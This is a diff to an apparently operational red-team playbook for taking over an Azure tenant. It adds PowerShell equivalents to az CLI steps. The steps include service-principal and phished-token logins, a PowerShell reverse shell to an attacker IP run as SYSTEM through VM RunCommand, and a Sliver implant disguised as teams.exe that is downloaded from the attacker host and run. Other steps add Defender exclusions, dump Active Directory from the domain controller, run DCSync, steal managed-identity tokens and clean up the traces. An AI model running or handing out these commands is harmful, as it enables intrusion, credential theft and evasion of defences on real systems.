@@ -114,8 +114,8 @@ You now have `/tmp/teams.exe` — AES-encrypted, code-signed Sliver beacon.
 
 ### 3a: Service Principal Login
 
+**Az CLI (Kali/Linux):**
 ```bash
-# Login with SP credentials (client ID + secret + tenant)
 az login --service-principal \
     --username "CLIENT_ID_HERE" \
     --password "CLIENT_SECRET_HERE" \
@@ -128,40 +128,69 @@ az login --service-principal \
     --tenant "MngEnvMCAP969165.onmicrosoft.com"
 ```
 
+**PowerShell (Az Module):**
+```powershell
+$cred = New-Object PSCredential("CLIENT_ID_HERE", (ConvertTo-SecureString "CLIENT_SECRET_HERE" -AsPlainText -Force))
+Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId "TENANT_ID_HERE"
+
+# Example:
+$cred = New-Object PSCredential("a1b2c3d4-e5f6-7890-abcd-ef1234567890", (ConvertTo-SecureString "MySecretValue123" -AsPlainText -Force))
+Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId "MngEnvMCAP969165.onmicrosoft.com"
+```
+
 ### 3b: Device Code Flow (Interactive — Useful for Phished Tokens)
 
+**Az CLI:**
 ```bash
 az login --use-device-code --tenant "TENANT_ID_HERE"
-# Opens a URL — enter the code shown, authenticate as the target user
+```
+
+**PowerShell:**
+```powershell
+Connect-AzAccount -UseDeviceAuthentication -TenantId "TENANT_ID_HERE"
 ```
 
 ### 3c: Managed Identity (From Inside an Azure VM)
 
+**Az CLI:**
 ```bash
 az login --identity
 ```
 
+**PowerShell:**
+```powershell
+Connect-AzAccount -Identity
+```
+
 ### 3d: Set Subscription + Verify
 
+**Az CLI:**
 ```bash
-# Set the target subscription
 az account set --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9"
-
-# Verify you're authenticated
 az account show -o table
-
-# List VMs you can access
 az vm list -g RGCORPSERVERS -o table
-
-# Check your role assignments
 az role assignment list --assignee "CLIENT_ID" --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" -o table
 ```
 
-### 3e: Install Az CLI (If Not Present)
+**PowerShell:**
+```powershell
+Set-AzContext -SubscriptionId "a985babf-347f-4ad4-bac5-510c6decd9d9"
+Get-AzContext | Format-Table
+Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location, ProvisioningState
+Get-AzRoleAssignment -SignInName "CLIENT_ID" | Format-Table RoleDefinitionName, Scope
+```
+
+### 3e: Install Az CLI / Az PowerShell Module
 
 ```bash
-# Kali/Ubuntu
+# Kali/Ubuntu — Az CLI
 curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
+```
+
+```powershell
+# Windows/PowerShell — Az Module
+Install-Module -Name Az -Repository PSGallery -Force -Scope CurrentUser
+Import-Module Az
 ```
 
 ---
@@ -176,8 +205,9 @@ Start with a reverse shell first — faster to iterate, and lets you add Defende
 nc -lvnp 8080
 ```
 
-### 4b: Deploy Reverse Shell via Az CLI
+### 4b: Deploy Reverse Shell
 
+**Az CLI:**
 ```bash
 az vm run-command create \
     --name "revshell-$(date +%s)" \
@@ -188,6 +218,14 @@ az vm run-command create \
     --async-execution true \
     --timeout-in-seconds 86400 \
     --script '$c=New-Object Net.Sockets.TcpClient("YOUR_KALI_IP",8080);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object IO.StreamReader($s);$w.WriteLine("PS "+$env:COMPUTERNAME+"\"+(Get-Location).Path+"> ");while($c.Connected){$cmd=$r.ReadLine();if($cmd -eq "exit"){break};try{$o=(iex $cmd 2>&1|Out-String);$w.Write($o)}catch{$w.Write($_.Exception.Message)};$w.WriteLine("`nPS "+$env:COMPUTERNAME+"\"+(Get-Location).Path+"> ")}'
+```
+
+**PowerShell (Az Module):**
+```powershell
+$script = '$c=New-Object Net.Sockets.TcpClient("YOUR_KALI_IP",8080);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object IO.StreamReader($s);$w.WriteLine("PS "+$env:COMPUTERNAME+"\\"+(Get-Location).Path+"> ");while($c.Connected){$cmd=$r.ReadLine();if($cmd -eq "exit"){break};try{$o=(iex $cmd 2>&1|Out-String);$w.Write($o)}catch{$w.Write($_.Exception.Message)};$w.WriteLine("`nPS "+$env:COMPUTERNAME+"\\"+(Get-Location).Path+"> ")}'
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+    -CommandId "RunPowerShellScript" -ScriptString $script
 ```
 
 You should get a shell back as `NT AUTHORITY\SYSTEM`.
@@ -217,12 +255,12 @@ $b=[Convert]::FromBase64String("BASE64_HERE")
 Start-Process "C:\ProgramData\Microsoft\Network\teams.exe"
 ```
 
-### 4e: Alternative — Direct Drop via Az CLI (If Defender Is Off)
+### 4e: Alternative — Direct Drop (If Defender Is Off)
 
 If you know Defender won't block (or exclusion is already set):
 
+**Az CLI:**
 ```bash
-# Base64 encode implant
 B64=$(base64 -w0 /tmp/teams.exe)
 
 az vm run-command create \
@@ -236,8 +274,24 @@ az vm run-command create \
     --script "\$b=[Convert]::FromBase64String('$B64');New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force|Out-Null;[IO.File]::WriteAllBytes('C:\ProgramData\Microsoft\Network\teams.exe',\$b);Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'"
 ```
 
-### 4f: Add Defender Exclusion via Az CLI (No Shell Needed)
+**PowerShell (Az Module):**
+```powershell
+$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\teams.exe"))
 
+$script = @"
+`$b=[Convert]::FromBase64String('$b64')
+New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force | Out-Null
+[IO.File]::WriteAllBytes('C:\ProgramData\Microsoft\Network\teams.exe',`$b)
+Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'
+"@
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+    -CommandId "RunPowerShellScript" -ScriptString $script
+```
+
+### 4f: Add Defender Exclusion (No Shell Needed)
+
+**Az CLI:**
 ```bash
 az vm run-command create \
     --name "exclude-$(date +%s)" \
@@ -248,8 +302,16 @@ az vm run-command create \
     --script "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'; Add-MpPreference -ExclusionProcess 'teams.exe'"
 ```
 
+**PowerShell (Az Module):**
+```powershell
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+    -CommandId "RunPowerShellScript" `
+    -ScriptString "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'; Add-MpPreference -ExclusionProcess 'teams.exe'"
+```
+
 ### 4g: List / Delete RunCommands (Cleanup — Max 25 Per VM)
 
+**Az CLI:**
 ```bash
 # List all RunCommands on a VM
 az vm run-command list --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" -o table
@@ -259,6 +321,18 @@ az vm run-command delete --name "revshell-1234567890" --vm-name "blueHttpServer"
 
 # Check result of a RunCommand
 az vm run-command show --name "deploy-1234567890" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --expand instanceView
+```
+
+**PowerShell (Az Module):**
+```powershell
+# List
+Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" | Format-Table Name, ProvisioningState
+
+# Delete
+Remove-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -RunCommandName "revshell-1234567890"
+
+# Check result
+Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -RunCommandName "deploy-1234567890" -Expand InstanceView
 ```
 
 ---
@@ -457,6 +531,7 @@ We have Contributor on the subscription, so RunCommand works on the DC directly.
 
 ### 12a: Full AD Dump
 
+**Az CLI:**
 ```bash
 az vm run-command create \
     --name "dc-recon-$(date +%s)" \
@@ -468,9 +543,19 @@ az vm run-command create \
     --script "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties MemberOf,ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | Format-Table -AutoSize; Get-ADGroupMember 'Domain Admins' | Select SamAccountName; Get-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address | Format-Table"
 ```
 
-Check the result:
-```bash
-az vm run-command show --name "dc-recon-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --expand instanceView
+**PowerShell (Az Module):**
+```powershell
+$adScript = @"
+Import-Module ActiveDirectory
+Get-ADUser -Filter * -Properties MemberOf,ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | Format-Table -AutoSize
+Get-ADGroupMember 'Domain Admins' | Select SamAccountName
+Get-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address | Format-Table
+"@
+
+$result = Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDC-01" `
+    -CommandId "RunPowerShellScript" -ScriptString $adScript
+$result.Value[0].Message   # stdout
+$result.Value[1].Message   # stderr
 ```
 
 ### 12b: DCSync (If You Have a Session on DC)
@@ -482,6 +567,7 @@ mimikatz lsadump::dcsync /user:contoso\Administrator
 
 ### 12c: Deploy Sliver on DC via RunCommand
 
+**Az CLI:**
 ```bash
 az vm run-command create \
     --name "dc-implant-$(date +%s)" \
@@ -494,10 +580,24 @@ az vm run-command create \
     --script "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'; New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force | Out-Null; Invoke-WebRequest -Uri 'http://YOUR_KALI_IP:8888/teams.exe' -OutFile 'C:\ProgramData\Microsoft\Network\teams.exe' -UseBasicParsing; Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'"
 ```
 
+**PowerShell (Az Module):**
+```powershell
+$deployScript = @"
+Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'
+New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force | Out-Null
+Invoke-WebRequest -Uri 'http://YOUR_KALI_IP:8888/teams.exe' -OutFile 'C:\ProgramData\Microsoft\Network\teams.exe' -UseBasicParsing
+Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'
+"@
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDC-01" `
+    -CommandId "RunPowerShellScript" -ScriptString $deployScript
+```
+
 ### 12d: Managed Identity Tokens
 
 Steal MI tokens from any VM with managed identity assigned:
 
+**Az CLI:**
 ```bash
 az vm run-command create \
     --name "mi-token-$(date +%s)" \
@@ -509,8 +609,21 @@ az vm run-command create \
     --script "\$r=Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Headers @{Metadata='true'} -UseBasicParsing; \$r.Content"
 ```
 
+**PowerShell (Az Module):**
+```powershell
+$miScript = @"
+`$r = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Headers @{Metadata='true'} -UseBasicParsing
+`$r.Content
+"@
+
+$result = Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDC-01" `
+    -CommandId "RunPowerShellScript" -ScriptString $miScript
+$result.Value[0].Message | ConvertFrom-Json   # parse the token JSON
+```
+
 ### 12e: EntraConnect ADSync
 
+**Az CLI:**
 ```bash
 az vm run-command create \
     --name "adsync-$(date +%s)" \
@@ -520,6 +633,14 @@ az vm run-command create \
     --location "westus3" \
     --timeout-in-seconds 60 \
     --script "Get-ADSyncConnector | Select Name,Type | Format-Table; Get-ADSyncScheduler | Format-List"
+```
+
+**PowerShell (Az Module):**
+```powershell
+$result = Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueEntraC-01" `
+    -CommandId "RunPowerShellScript" `
+    -ScriptString "Get-ADSyncConnector | Select Name,Type | Format-Table; Get-ADSyncScheduler | Format-List"
+$result.Value[0].Message
 ```
 
 ---
@@ -566,6 +687,7 @@ exit
 
 ### 14b: Delete All RunCommands from Azure
 
+**Az CLI:**
 ```bash
 # List all RunCommands on each VM
 for VM in blueHttpServer blueDC-01 blueEntraC-01; do
@@ -581,6 +703,22 @@ az vm run-command delete --name "dc-recon-TIMESTAMP" --vm-name "blueDC-01" --res
 az vm run-command delete --name "dc-implant-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --yes
 az vm run-command delete --name "mi-token-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --yes
 az vm run-command delete --name "adsync-TIMESTAMP" --vm-name "blueEntraC-01" --resource-group "RGCORPSERVERS" --yes
+```
+
+**PowerShell (Az Module):**
+```powershell
+# List all RunCommands on each VM
+foreach ($vm in @("blueHttpServer", "blueDC-01", "blueEntraC-01")) {
+    Write-Host "=== $vm ===" -ForegroundColor Cyan
+    Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName $vm | Format-Table Name, ProvisioningState
+}
+
+# Delete all RunCommands on a VM (bulk cleanup)
+$vm = "blueHttpServer"
+Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName $vm | ForEach-Object {
+    Write-Host "Deleting $($_.Name)..."
+    Remove-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName $vm -RunCommandName $_.Name -NoWait
+}
 ```
 
 **Note**: Max 25 RunCommands per VM. Delete old ones or Azure will reject new ones.
